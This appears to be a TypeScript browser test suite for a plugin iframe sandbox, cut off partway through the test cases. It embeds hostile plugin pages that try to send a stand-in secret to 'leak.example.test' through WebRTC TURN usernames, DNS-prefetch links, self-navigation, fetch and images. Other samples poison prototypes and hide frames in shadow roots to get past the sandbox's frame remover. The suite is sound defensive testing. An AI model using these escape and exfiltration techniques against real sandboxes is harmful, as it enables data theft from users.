import { afterEach, beforeAll, describe, expect, it } from "vitest";
// The policy under test, read from the document the app actually ships, so
// deleting it there fails this test instead of leaving it passing on a copy.
import appIndexHtml from "../../public/index.html?raw";
import { createPluginIframe } from "./frame.web";

/**
 * The denial test. A sandboxed iframe is always allowed to navigate *itself*,
 * and nothing in the guest's own CSP stops it — `frame-src 'none'` on the
 * **host** document is what does, because a child frame's navigation is checked
 * against its parent's policy. This mounts a hostile plugin that tries every
 * exfiltration vector and asserts that not one request leaves the page.
 */
const EXFIL_MARKER = "__exfil__";

function hostContentSecurityPolicy(): string {
  const match = appIndexHtml.match(
    /<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/i,
  );
  if (!match) {
    throw new Error(
      "packages/app/public/index.html has no Content-Security-Policy meta: the plugin frame can navigate itself out to any origin",
    );
  }
  return match[1];
}

const HOSTILE_PLUGIN_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var violations = [];
      document.addEventListener("securitypolicyviolation", function (event) {
        violations.push(event.effectiveDirective || event.violatedDirective);
      });

      window.addEventListener("message", function (event) {
        var data = event.data;
        if (!data || data.exfil !== 1) return;

        if (data.type === "attack") {
          var target = data.base;
          var outcomes = { windowOpen: "opened" };

          try {
            outcomes.windowOpen = window.open(target + "/open", "_blank") === null ? "blocked" : "opened";
          } catch (error) {
            outcomes.windowOpen = "blocked";
          }

          var form = document.createElement("form");
          form.method = "POST";
          form.action = target + "/form";
          document.body.appendChild(form);
          try { form.submit(); } catch (error) {}

          // A URL the host proves is loadable, so "did not load" can only mean
          // the request was refused.
          var img = document.createElement("img");
          img.onload = function () { outcomes.img = "loaded"; };
          img.onerror = function () { outcomes.img = "blocked"; };
          img.src = data.imageUrl;
          document.body.appendChild(img);

          var nested = document.createElement("iframe");
          nested.src = target + "/frame";
          document.body.appendChild(nested);

          // WebRTC is the channel no CSP directive can express: the plugin picks
          // the ICE server host, port, username and credential, so a TURN
          // Allocate carries whatever it wants to wherever it wants.
          outcomes.rtc = typeof RTCPeerConnection === "undefined" ? "absent" : "present";
          try {
            new RTCPeerConnection({ iceServers: [{ urls: "stun:" + data.rtcHost }] });
            outcomes.rtcConstruct = "constructed";
          } catch (error) {
            outcomes.rtcConstruct = "threw";
          }
          // A fresh realm must not hand the constructor back. Reading
          // contentWindow from here proves nothing: it throws cross-origin
          // whether or not the child has WebRTC. So the child reports from
          // inside its own realm, which is where the attack actually runs.
          var CHILD =
            "<script>parent.parent.postMessage({exfil:1,type:'child'," +
            "tag:'TAG',rtc:typeof RTCPeerConnection},'*');<\\/script>";
          try {
            var realm = document.createElement("iframe");
            realm.srcdoc = CHILD.replace("TAG", "append");
            document.body.appendChild(realm);
          } catch (error) {}


          fetch(target + "/fetch").then(
            function () { outcomes.fetch = "sent"; },
            function () { outcomes.fetch = "blocked"; }
          ).then(function () {
            setTimeout(function () {
              // Read after a turn: the removal is a MutationObserver callback,
              // so it has not run yet at appendChild time.
              outcomes.rtcViaFrame = document.querySelector("iframe") ? "attached" : "removed";
              outcomes.violations = violations;
              window.parent.postMessage({ exfil: 1, type: "report", outcomes: outcomes }, "*");
            }, 250);
          });
          return;
        }

        if (data.type === "ping") {
          window.parent.postMessage({ exfil: 1, type: "pong" }, "*");
          return;
        }

        if (data.type === "navigate") {
          // The one the guest's own CSP cannot stop.
          location.href = data.base + "/navigate?d=" + encodeURIComponent(data.secret);
        }
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Removing child frames is a runtime control, so the interesting attacks are on
 * the remover rather than on the frames. Both of these beat an earlier version.
 *
 * `poison` replaces the DOM methods the sweep uses. Our script runs first, but
 * anything it resolves at mutation time is the plugin's to redefine by then, so
 * the observer fires and quietly does nothing.
 *
 * `docwrite` calls `document.write()` after load, which implies `document.open()`
 * and builds a brand new `documentElement`. An observer bound to that node is
 * left watching something detached.
 *
 * Each child reports `typeof RTCPeerConnection` from its own realm — the only
 * vantage point that proves anything, since the parent's view is decided by the
 * opaque origin rather than by whether the child has WebRTC.
 */
const REMOVER_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "<script>parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection},'*');<\\/script>";

      function plant(tag) {
        var frame = document.createElement("iframe");
        frame.srcdoc = CHILD.replace("TAG", tag);
        document.body.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          Element.prototype.remove = function () {};
          Element.prototype.matches = function () { return false; };
          Element.prototype.querySelectorAll = function () { return []; };
          Node.prototype.removeChild = function (node) { return node; };
        } catch (error) {}
        try { plant("poison"); } catch (error) {}

        try {
          document.write("<iframe srcdoc=\\"" + CHILD.replace("TAG", "docwrite") + "\\"><\\/iframe>");
          document.close();
        } catch (error) {}
        // After the rewrite the tree is new; plant one more to prove the
        // observer is still armed on the replacement document.
        try { plant("after-rewrite"); } catch (error) {}

        // No frame count here on purpose: querySelectorAll is one of the methods
        // this plugin just poisoned, so counting from inside would report
        // whatever the attacker wants. The children speak for themselves.
        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 300);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * A shadow root is a second tree that neither of the remover's two tools can
 * see: `querySelectorAll` does not descend through a shadow boundary, and a
 * `MutationObserver` on `document` is never told about mutations inside one.
 * An `<iframe>` in a shadow root still gets a real browsing context, so the
 * plugin gets a fresh realm with `RTCPeerConnection` intact.
 *
 * Three orderings, because the boundary defeats the sweep either way round:
 * building the shadow tree while the host is detached, filling it after the
 * host is attached, and doing it in a `closed` root the host cannot even reach.
 */
const SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      // Constructing the connection is the exfiltration: the plugin picks the
      // TURN host and the username, so the Allocate carries its payload out.
      var CHILD = "<script>var ice='no';try{" +
        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "pc.createOffer().then(function(d){pc.setLocalDescription(d)});ice='gathering'" +
        "}catch(e){ice='threw'}" +
        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      function frameIn(root, tag) {
        var frame = document.createElement("iframe");
        frame.srcdoc = CHILD.replace("TAG", tag);
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          var detached = document.createElement("div");
          frameIn(detached.attachShadow({ mode: "open" }), "shadow-detached");
          document.body.appendChild(detached);
        } catch (error) {}

        try {
          var attached = document.createElement("div");
          document.body.appendChild(attached);
          frameIn(attached.attachShadow({ mode: "open" }), "shadow-attached");
        } catch (error) {}

        try {
          var closed = document.createElement("div");
          document.body.appendChild(closed);
          frameIn(closed.attachShadow({ mode: "closed" }), "shadow-closed");
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 400);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * The doors to a shadow root the observer can never see into. A closed root
 * built by the HTML parser is unreachable from script afterwards — there is no
 * `shadowRoot` to read and no `attachShadow` call to wrap — so the only defence
 * is that the parser never runs over plugin markup.
 */
const DECLARATIVE_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <div id="dsd">
      <template shadowrootmode="closed">
        <iframe srcdoc="&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478',username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage({exfil:1,type:'child',tag:'declarative',ice:ice},'*');&lt;/script&gt;"></iframe>
      </template>
    </div>
    <script>
      var denied = [];
      function refused(name, run) {
        try { run(); } catch (error) { denied.push(name); }
      }
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var HOSTED = "<div><template shadowrootmode='closed'>" +
          "<iframe srcdoc=\\"&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
          "tag:'TAG',ice:typeof RTCPeerConnection},'*');&lt;/script&gt;\\"><\\/iframe>" +
          "<\\/template><\\/div>";

        refused("write", function () { document.write(HOSTED.replace("TAG", "write")); });
        refused("setHTMLUnsafe", function () {
          document.body.setHTMLUnsafe(HOSTED.replace("TAG", "setHTMLUnsafe"));
        });
        refused("parseHTMLUnsafe", function () {
          document.body.appendChild(
            document.adoptNode(
              Document.parseHTMLUnsafe(HOSTED.replace("TAG", "parseHTMLUnsafe")).body.firstChild,
            ),
          );
        });

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", denied: denied }, "*");
        }, 400);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Resource hints are a DNS/connection channel CSP does not express.
 * `rel="dns-prefetch"` resolves an attacker-chosen hostname and
 * `rel="preconnect"` also opens the socket, without ever making a request a
 * policy could be consulted for — the payload rides in the subdomain labels,
 * exactly the DNS exfiltration the shell deletes `RTCPeerConnection` to close.
 * A `<link>` is not a browsing context, so the frame sweep never looked at one.
 *
 * A hint fires the moment the element is connected, which is before any
 * observer's microtask, so nothing can be removed in time. What the shell does
 * instead is never connect one: the plugin's markup is sanitised while it is
 * still detached. This asserts that — no `<link>` from plugin markup reaches the
 * document, whatever its `rel`.
 */
const RESOURCE_HINT_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <link rel="dns-prefetch" href="https://dnspf.leak.example.test/">
    <link rel="preconnect" href="https://preconn.leak.example.test/">
    <link rel="stylesheet" href="https://sheet.leak.example.test/x.css">
    <div><link rel="prefetch" href="https://nested.leak.example.test/x"></div>
    <script>
      setTimeout(function () {
        var rels = [];
        var links = document.querySelectorAll("link");
        for (var i = 0; i < links.length; i++) rels.push(links[i].rel);
        window.parent.postMessage({ exfil: 1, type: "hints", rels: rels }, "*");
      }, 200);
    </script>
  </body>
</html>`;

/**
 * The sweep's own machinery, one level up from the DOM methods an earlier round
 * poisoned. `watch()` calls `observer.observe(root, ...)`, and `observe` is
 * resolved off `MutationObserver.prototype` at mutation time — after the
 * plugin's script has run. Replace it with a no-op and every shadow root the
 * wrapped `attachShadow` hands out is swept once and then never watched again,
 * so a frame appended to that root afterwards is invisible: a `MutationObserver`
 * on `document` is never notified of mutations inside a shadow tree.
 *
 * This test FAILS as of 68e6bb13d — the child realm gets `RTCPeerConnection`
 * back and reaches an attacker-chosen TURN host. The fix is to capture
 * `MutationObserver.prototype.observe` up front like every other method the
 * sweep uses, and call it through `Reflect.apply`.
 */
const OBSERVER_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";

      function plantInto(root, tag) {
        var frame = document.createElement("iframe");
        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try { MutationObserver.prototype.observe = function () {}; } catch (error) {}

        // Closed: the wrapper is the only thing that ever sees this root, and it
        // just lost the ability to watch it.
        try {
          var closedHost = document.createElement("div");
          document.body.appendChild(closedHost);
          var closedRoot = closedHost.attachShadow({ mode: "closed" });
          plantInto(closedRoot, "poisoned-observe");
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 8 poisoned `observe` itself. This one leaves `observe` alone and
 * poisons what it *reads*.
 *
 * `watch()` calls `A(startWatching, observer, [root, WATCH])` with `WATCH` — a
 * plain object literal built at init, so its prototype is `Object.prototype`.
 * `observe` converts it to a `MutationObserverInit` dictionary, and WebIDL
 * dictionary conversion is a `Get` per member: every member `WATCH` does not
 * own is read off `Object.prototype`, which the plugin owns. `attributeFilter`
 * is a `sequence<DOMString>`, so a non-iterable value there makes the
 * conversion throw a `TypeError` before `observe` does anything.
 *
 * Capturing the method did not help: it is the *argument* that is late-bound.
 * `watch()` then throws before it reaches `sweep(root)`, so the root is both
 * unwatched and unswept — and `follow()` inside the sweep throws for the same
 * reason on every later attempt, so the belt-and-braces open-root scan cannot
 * recover it either.
 *
 * Both orderings: attach the root to an already-connected host so no document
 * mutation ever names it again, and attach it to a detached host so the
 * document-level sweep gets its turn and dies in `follow()`.
 *
 * This test FAILS as of fb954accd — both children report
 * `RTCPeerConnection` back and reach an attacker-chosen TURN host with the
 * payload in the ICE username. The fix is for the shell to build every object
 * it hands to a web API with `Object.create(null)`, so no dictionary member it
 * leaves unset is read off a prototype the plugin owns: `WATCH` here, and the
 * `attachShadow` init object next to it (`Object.prototype.clonable = true`
 * there yields a shadow root from `cloneNode` with no `attachShadow` call
 * anywhere). Capturing the callee is not enough when the argument is late-bound.
 */
const OBSERVER_INIT_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',ice:ice},'*');&lt;/script&gt;";

      function plantInto(root, tag) {
        var frame = document.createElement("iframe");
        frame.setAttribute("srcdoc", CHILD.replace("TAG", tag).replace(/&lt;/g, "<").replace(/&gt;/g, ">"));
        root.appendChild(frame);
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        // Not a member of the shell's WATCH object, so it is read off
        // Object.prototype. A non-iterable makes sequence<DOMString> throw.
        try { Object.prototype.attributeFilter = 1; } catch (error) {}

        // Host already connected: after attachShadow throws, nothing the plugin
        // does inside the root is ever a document mutation.
        try {
          var connected = document.createElement("div");
          document.body.appendChild(connected);
          try { connected.attachShadow({ mode: "closed" }); } catch (error) {}
          plantInto(connected.shadowRoot, "init-poison-connected");
        } catch (error) {}

        // Host detached: the document sweep does see it, and dies in follow().
        try {
          var detached = document.createElement("div");
          try { detached.attachShadow({ mode: "closed" }); } catch (error) {}
          plantInto(detached.shadowRoot, "init-poison-detached");
          document.body.appendChild(detached);
        } catch (error) {}

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept" }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 10, and the same class as rounds 8 and 9: the shell calls something it
 * did not capture. `bare()` resolves `Object.create` when it is *called*, and the
 * `attachShadow` wrapper calls it on every `attachShadow` — long after the
 * plugin's script has run. So the null-prototype object the wrapper hands the
 * real `attachShadow` is whatever the plugin's `Object.create` returns.
 *
 * A `mode` accessor that swallows the wrapper's `options.mode = "open"` and
 * reports `"closed"` defeats the one thing the wrapper exists to force. The
 * wrapper still watches the root it gets back, so the frame cannot go in there
 * directly — but `clonable: true` is a member the wrapper copies across, and
 * `cloneNode` mints a second *closed* root that no `attachShadow` call ever saw.
 * `follow()` reads `element.shadowRoot`, which is null for a closed root, so the
 * clone is invisible to every sweep and the frame inside it loads.
 */
const BARE_POISON_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "<script>var ice='no';try{" +
        "var pc=new RTCPeerConnection({iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}" +
        "parent.parent.postMessage({exfil:1,type:'child',tag:'TAG'," +
        "rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var note = "no";
        try {
          // The shell's \`bare()\` is \`function(){ return Object.create(null); }\`,
          // resolved at call time. Own it.
          Object.create = function () {
            return {
              get mode() { return "closed"; },
              set mode(value) {},
              get clonable() { return true; },
              set clonable(value) {},
            };
          };

          // Detached, so nothing here is ever a document mutation and the frame
          // does not load until the clone is connected.
          var host = document.createElement("div");
          // \`clonable\` is an accessor pair too, so the wrapper's
          // \`options.clonable = init.clonable\` cannot clear it back to undefined.
          var root = host.attachShadow({ mode: "closed" });
          note = host.shadowRoot === null ? "closed" : "open";

          var frame = document.createElement("iframe");
          frame.srcdoc = CHILD.replace("TAG", "bare-poison");
          root.appendChild(frame);

          // Synchronous: the wrapper's observer removes the frame from \`root\` in
          // a microtask, and this runs before that. The clone keeps its copy in a
          // closed root nothing is watching.
          var clone = host.cloneNode(true);
          document.body.appendChild(clone);
        } catch (error) {
          note = "threw:" + (error && error.message);
        }

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", note: note }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 11. The shell denies every *unsafe-named* door to a declarative shadow
 * root — `document.write`, `Element.setHTMLUnsafe`, `ShadowRoot.setHTMLUnsafe`,
 * `Document.parseHTMLUnsafe` — and relies on fragment parsing leaving
 * `<template shadowrootmode>` inert everywhere else.
 *
 * `DOMParser.parseFromString(html, "text/html")` is not a fragment parse. It is
 * a full document parse, and the HTML spec sets "allow declarative shadow roots"
 * for it, precisely because the document it returns is inert and therefore not
 * an injection sink on its own. It is not denied by the shell.
 *
 * Inert only lasts until the node moves. `document.adoptNode` *moves* the host
 * element into the live document — it is not a clone, so `clonable` never comes
 * into it — and the closed shadow root travels with it. Appending it connects
 * the `<iframe>` inside that root to a browsing context.
 *
 * Nothing downstream can see it. The `MutationObserver` on `document` is never
 * told about the inside of a shadow tree, `querySelectorAll` does not cross the
 * boundary, `follow()` reads `element.shadowRoot` which is `null` for a closed
 * root, and no `attachShadow` call ever happened for the wrapper to intercept.
 * The child realm loads with `RTCPeerConnection` intact and reaches an
 * attacker-chosen TURN host with the payload in the ICE username.
 *
 * `importNode` is included as the second ordering: same parse, a copy rather
 * than a move.
 */
const DOMPARSER_SHADOW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";

      function markup(tag) {
        return "<div id='dsdhost'><template shadowrootmode='closed'>" +
          "<iframe srcdoc=\\"" + CHILD.replace("TAG", tag) + "\\"></iframe>" +
          "</template></div>";
      }

      function describe(host) {
        if (!host) return "nohost";
        // A DSD-aware parse consumes the <template> and leaves a closed root, so
        // the host has no children and no readable shadowRoot.
        return "kids=" + host.childNodes.length + ";shadow=" + (host.shadowRoot ? "open" : "none");
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var notes = [];

        try {
          var moved = new DOMParser().parseFromString(markup("domparser-adopt"), "text/html");
          var movedHost = moved.getElementById("dsdhost");
          notes.push("adopt:" + describe(movedHost));
          document.body.appendChild(document.adoptNode(movedHost));
        } catch (error) {
          notes.push("adopt:threw:" + (error && error.message));
        }

        try {
          var copied = new DOMParser().parseFromString(markup("domparser-import"), "text/html");
          var copiedHost = copied.getElementById("dsdhost");
          notes.push("import:" + describe(copiedHost));
          document.body.appendChild(document.importNode(copiedHost, true));
        } catch (error) {
          notes.push("import:threw:" + (error && error.message));
        }

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 11 probes: two realms the frame sweep never looks at.
 *
 * `<use>` instantiates a *closed, UA-owned* shadow tree — `use.shadowRoot` is
 * null and `querySelectorAll` cannot reach into it — and `foreignObject` is an
 * HTML integration point, so an `<iframe>` cloned into that tree would be a
 * browsing context nothing here can find.
 *
 * A `blob:` `Worker` is a fresh realm too. It has no `RTCPeerConnection`, but it
 * does have `fetch` and `WebSocket`, and the shell never touches it.
 */
const REALM_PROBE_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var CHILD = "&lt;script&gt;parent.parent.postMessage({exfil:1,type:'child'," +
        "tag:'TAG',rtc:typeof RTCPeerConnection},'*');&lt;/script&gt;";
      var notes = [];

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
        var url = event.data.imageUrl;

        try {
          var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
          svg.innerHTML =
            "<g id='usesrc'><foreignObject width='50' height='50'><iframe srcdoc=\\"" +
            CHILD.replace("TAG", "svg-use") + "\\"></iframe></foreignObject></g>" +
            "<use href='#usesrc'></use>";
          document.body.appendChild(svg);
          notes.push("use:inserted");
        } catch (error) {
          notes.push("use:threw:" + (error && error.message));
        }

        try {
          var source =
            "self.postMessage('rtc=' + (typeof RTCPeerConnection));" +
            "fetch(" + JSON.stringify(url) + ").then(" +
            "function(){self.postMessage('fetch=sent')}," +
            "function(){self.postMessage('fetch=blocked')});";
          var blob = new Blob([source], { type: "text/javascript" });
          var worker = new Worker(URL.createObjectURL(blob));
          worker.onmessage = function (message) { notes.push("worker:" + message.data); };
          worker.onerror = function () { notes.push("worker:error"); };
          notes.push("worker:constructed");
        } catch (error) {
          notes.push("worker:threw:" + (error && error.message));
        }

        setTimeout(function () {
          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
        }, 900);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

interface Outcomes {
  windowOpen: string;
  fetch: string;
  img: string;
  rtc: string;
  rtcConstruct: string;
  rtcViaFrame: string;
  violations: string[];
}

function loadImage(url: string): Promise<boolean> {
  return new Promise((resolve) => {
    const img = new Image();
    img.addEventListener("load", () => resolve(true));
    img.addEventListener("error", () => resolve(false));
    img.src = url;
  });
}

const cleanups: Array<() => void> = [];

afterEach(() => {
  while (cleanups.length > 0) {
    cleanups.pop()?.();
  }
});

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitFor<T>(read: () => T | null, what: string): Promise<T> {
  const deadline = Date.now() + 5000;
  for (;;) {
    const value = read();
    if (value !== null) {
      return value;
    }
    if (Date.now() > deadline) {
      throw new Error(`Timed out waiting for ${what}`);
    }
    await sleep(10);
  }
}

beforeAll(() => {
  // Chromium applies a CSP meta inserted after load, so the test document runs
  // under the same policy the app ships.
  const meta = document.createElement("meta");
  meta.httpEquiv = "Content-Security-Policy";
  meta.content = hostContentSecurityPolicy();
  document.head.appendChild(meta);
});

describe("a hostile plugin", () => {
  it("cannot get a single request out, including by navigating its own frame", async () => {
    expect(hostContentSecurityPolicy()).toContain("frame-src 'none'");

    // Same-origin, so anything that is not refused genuinely reaches a server.
    // "https://evil.tld" would fail DNS and prove nothing.
    const base = `${location.origin}/${EXFIL_MARKER}`;
    const secret = "s3cr3t-file-content";
    const imageUrl = `${location.origin}/pwa-icon-192.png?${EXFIL_MARKER}=${secret}`;

    // The control: this exact URL loads from the host document, so the plugin
    // failing to load it is the sandbox refusing the request, not a dead URL.
    expect(await loadImage(imageUrl)).toBe(true);

    const hostViolations: string[] = [];
    const onHostViolation = (event: SecurityPolicyViolationEvent) => {
      hostViolations.push(
        `${event.effectiveDirective || event.violatedDirective} ${event.blockedURI}`,
      );
    };
    document.addEventListener("securitypolicyviolation", onHostViolation);

    let loads = 0;
    let report: Outcomes | null = null;
    // Anything the child manages to say, from its own realm. Note the source
    // check below deliberately excludes it, so it needs its own listener.
    const childReports: unknown[] = [];
    const onChildReport = (event: MessageEvent) => {
      if (event.data?.exfil === 1 && event.data.type === "child") {
        childReports.push(event.data);
      }
    };
    window.addEventListener("message", onChildReport);
    cleanups.push(() => window.removeEventListener("message", onChildReport));
    const iframe = createPluginIframe(HOSTILE_PLUGIN_HTML);
    iframe.addEventListener("load", () => {
      loads += 1;
    });
    const onMessage = (event: MessageEvent) => {
      if (event.source !== iframe.contentWindow || event.data?.exfil !== 1) {
        return;
      }
      if (event.data.type === "ready") {
        iframe.contentWindow?.postMessage(
          { exfil: 1, type: "attack", base, imageUrl, rtcHost: new URL(base).host },
          "*",
        );
      }
      if (event.data.type === "report") {
        report = event.data.outcomes as Outcomes;
      }
    };
    window.addEventListener("message", onMessage);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      document.removeEventListener("securitypolicyviolation", onHostViolation);
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const outcomes = await waitFor<Outcomes>(() => report, "the hostile plugin's report");

    // srcdoc is exempt from frame-src, so the plugin still runs at all.
    expect(loads).toBe(1);
    expect(outcomes.fetch).toBe("blocked");
    expect(outcomes.windowOpen).toBe("blocked");
    expect(outcomes.img).toBe("blocked");
    // The form POST needs no CSP violation to be stopped: the frame has no
    // `allow-forms`, so it never becomes a request — the load count above is
    // what proves the frame did not submit anywhere.
    expect(outcomes.violations).toEqual(
      expect.arrayContaining(["connect-src", "img-src", "frame-src"]),
    );

    // No CSP directive can express this one, so the shell deletes the
    // constructors outright and a fresh realm must not return them.
    expect(outcomes.rtc).toBe("absent");
    expect(outcomes.rtcConstruct).toBe("threw");

    // The deletion only covers the realm it ran in, so the plugin must not get
    // a second realm. The child never becomes a browsing context: it is removed
    // as it is inserted, so its script never parses and it never reports.
    expect(outcomes.rtcViaFrame).toBe("removed");
    expect(childReports).toEqual([]);

    // Now the vector the guest's own policy cannot stop.
    iframe.contentWindow?.postMessage({ exfil: 1, type: "navigate", base, secret }, "*");
    await sleep(500);

    // The parent's `frame-src` is the only thing that can report this, and that
    // is the point: the guest's own policy never sees its own navigation.
    // Chromium blocks it, drops the frame to an empty document (hence the
    // second load), and never sends the request.
    expect(hostViolations.join("\n")).toContain(`frame-src ${base}/navigate`);
    expect(loads).toBe(2);

    // The frame no longer answers, so the host's `update` messages go to a
    // blank opaque document rather than to the attacker's page.
    let answered = false;
    const onPong = (event: MessageEvent) => {
      if (event.source === iframe.contentWindow) {
        answered = true;
      }
    };
    window.addEventListener("message", onPong);
    cleanups.push(() => window.removeEventListener("message", onPong));
    iframe.contentWindow?.postMessage({ exfil: 1, type: "ping" }, "*");
    await sleep(200);
    expect(answered).toBe(false);
  });

  it("cannot get a child realm by attacking the remover itself", async () => {
    const childReports: Array<{ tag: string; rtc: string }> = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      if (event.data?.exfil !== 1) {
        return;
      }
      if (event.data.type === "child") {
        childReports.push({ tag: event.data.tag, rtc: event.data.rtc });
      }
      if (event.data.type === "swept") {
        swept = true;
      }
      if (event.data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(REMOVER_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the remover attack to finish");

    // Any report at all means a child realm reached script execution, and every
    // such realm hands back a `RTCPeerConnection` the shell never touched.
    expect(childReports).toEqual([]);
  });

  it("cannot get a child realm by hiding the frame in a shadow root", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the shadow attack to finish");

    expect(childReports).toEqual([]);
  });

  it("cannot get a closed shadow root out of the HTML parser", async () => {
    const childReports: string[] = [];
    let denied: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        denied?: string[];
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        denied = data.denied ?? [];
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

